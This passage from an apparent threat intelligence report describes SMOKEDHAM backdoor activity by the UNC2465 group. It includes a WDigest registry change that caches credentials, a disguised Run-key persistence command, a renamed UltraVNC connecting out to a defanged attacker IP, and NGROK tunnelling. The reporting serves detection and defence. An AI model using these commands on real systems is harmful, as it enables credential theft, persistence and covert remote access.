Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.
Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.
These files were saved to the %APPDATA%\\Chrome\\ directory.
The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter
AllowLoopback=1.
Figure 8: Contents of UltraVNC.ini SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.

ID:15000151 -connect 81.91.177[.]54[:]7234 â€“run SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.
reg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ConhostNT /d %appdata%\\Chrome\\winvnc.exe NGROK Configuration SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.
These files were stored in the C:\\ProgramData\\WindNT\\ directory.
NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.
Figure 9 and Figure 10 show the contents of VirtualHost.vbs and ngrok.yml files, respectively.

The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.
